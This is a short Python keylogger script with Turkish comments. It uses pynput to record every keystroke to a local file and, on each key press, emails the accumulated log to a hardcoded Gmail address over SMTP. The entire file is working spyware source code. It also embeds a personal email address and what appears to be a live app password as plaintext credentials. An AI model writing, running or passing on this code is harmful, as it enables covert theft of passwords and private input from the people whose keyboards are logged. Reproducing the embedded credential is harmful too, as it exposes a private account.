import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

# E-posta ayarları
from_email = "kayra.dalcik@gmail.com"  # Kendi e-posta adresini yaz
to_email = "kayra.dalcik@gmail.com"    # Hedef e-posta adresini yaz
password = "lygz xomo hhju oilf"  # Gmail şifreni buraya yaz

def email_gonder(message):
    try:
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = 'Keylogger Verisi'

        msg.attach(MIMEText(message, 'plain'))

        # Gmail SMTP sunucusuna bağlan
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, password)

        # E-postayı gönder
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()
        print("E-posta gönderildi!")
    except Exception as e:
        print(f"Bir hata oluştu: {e}")

log_dosyasi = "keylog.txt"

def log_yaz(key):
    try:
        with open(log_dosyasi, "a") as dosya:
            if hasattr(key, 'char'):
                dosya.write(key.char)
            else:
                dosya.write(f" [{key}] ")

        # Veriyi e-posta olarak gönder
        with open(log_dosyasi, "r") as dosya:
            message = dosya.read()
            email_gonder(message)
    except Exception as e:
        print(f"Hata: {e}")

def basilan_tus(key):
    log_yaz(key)

with keyboard.Listener(on_press=basilan_tus) as dinleyici:
    dinleyici.join()
